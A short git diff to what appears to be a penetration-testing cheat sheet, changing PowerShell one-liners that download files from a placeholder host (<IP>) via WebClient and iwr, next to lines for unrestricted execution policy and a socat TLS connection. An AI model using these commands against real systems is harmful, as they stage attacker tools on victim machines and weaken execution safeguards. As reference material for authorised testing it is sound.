@@ -703,7 +703,8 @@ $ socat - OPENSSL:<IP>:<PORT>,verify=0                                          
 ```
 Set-ExecutionPolicy Unrestricted                                                                        Set the PowerShell execution policy
 Get-ExecutionPolicy                                                                                     Get value for ExecutionPolicy
-(new-object System.Net.WebClient).DownloadFile('http://<IP>/wget.exe','C:\<DIR>\wget.exe')              Download a file
+(new-object System.Net.WebClient).DownloadFile('http://<IP>/<filename>','C:\<DIR>\<filename>')          Download a file
+iwr -uri http://<IP>/<filename> -Outfile <filename>                                                     Download a file
 powershell -c "command"                                                                                 The -c option will execute the supplied command as if it were typed at the PowerShell prompt
 ```
 
